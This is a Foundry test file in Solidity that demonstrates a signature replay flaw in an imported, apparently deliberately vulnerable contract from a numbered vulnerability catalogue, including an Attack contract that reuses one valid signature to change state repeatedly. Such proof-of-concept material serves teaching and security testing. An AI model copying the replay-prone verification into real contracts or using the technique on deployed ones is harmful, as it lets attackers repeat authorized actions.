pragma solidity ^0.8.0;

// Import Foundry's Test framework
import "forge-std/Test.sol";

// Import the vulnerable contract
import "../src/8.3.1-Incorrect-Verification-of-Cryptographic-Signature-vulnerability.sol";

contract VulnerableTest is Test {
    Vulnerable public vulnerable;
    Attack public attackContract;

    // Use a well-known private key for the authorized signer
    uint256 constant authorizedPrivateKey = 1;
    address public authorizedSigner;

    function setUp() public {
        // Derive the authorized signer address from the private key
        authorizedSigner = vm.addr(authorizedPrivateKey);
        // Deploy the vulnerable contract with the authorized signer
        vulnerable = new Vulnerable(authorizedSigner);
        // Deploy the attacker contract with the address of the vulnerable contract
        attackContract = new Attack(address(vulnerable));
    }

    // Helper function that signs a message using vm.sign
    function signMessage(string memory message, uint256 key) internal returns (bytes memory) {
        // Calculate the message hash in the same way as the vulnerable contract
        bytes32 digest = keccak256(abi.encodePacked(message));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        // Concatenate r, s, v to form the signature in the expected format
        return abi.encodePacked(r, s, v);
    }

    // Test that shows a valid signature processes the message and replay is possible
    function testProcessMessageAndReplay() public {
        string memory message = "Hello";
        bytes memory signature = signMessage(message, authorizedPrivateKey);

        // First call to processMessage
        vulnerable.processMessage(message, signature);
        bytes32 expectedHash = keccak256(abi.encodePacked(bytes32(0), keccak256(abi.encodePacked(message))));
        assertEq(vulnerable.lastProcessedHash(), expectedHash, "First processMessage failed");

        // Replay attack: Calling processMessage again with the same message and signature
        vulnerable.processMessage(message, signature);
        bytes32 secondExpectedHash = keccak256(abi.encodePacked(expectedHash, keccak256(abi.encodePacked(message))));
        assertEq(vulnerable.lastProcessedHash(), secondExpectedHash, "Replay attack did not update state as expected");
    }

    // Test using the Attack contract to replay a legitimate signature
    function testAttack() public {
        string memory message = "Hello"; // In a real attack, the attacker might try to use a malicious message that collides in encoding.
                                           // Here we simply demonstrate that the Attack contract can replay a valid signature to update the state repeatedly.
        bytes memory signature = signMessage(message, authorizedPrivateKey);

        // Attacker uses the attack contract to update the state
        attackContract.attack(message, signature);
        bytes32 expectedHash = keccak256(abi.encodePacked(bytes32(0), keccak256(abi.encodePacked(message))));
        assertEq(vulnerable.lastProcessedHash(), expectedHash, "Attack contract first attack failed");

        // Replay attack: Attack contract uses the same valid signature to update the state again
        attackContract.attack(message, signature);
        bytes32 secondExpectedHash = keccak256(abi.encodePacked(expectedHash, keccak256(abi.encodePacked(message))));
        assertEq(vulnerable.lastProcessedHash(), secondExpectedHash, "Attack contract replay attack failed");
    }

    // Test that an invalid signature is rejected
    function testInvalidSignature() public {
        string memory message = "Hello";
        bytes memory signature = signMessage(message, authorizedPrivateKey);

        // Modify the signature slightly so that it does not match
        signature[signature.length - 1] = bytes1(uint8(signature[signature.length - 1]) + 1);
        vm.expectRevert("Not authorized");
        vulnerable.processMessage(message, signature);
    }
}
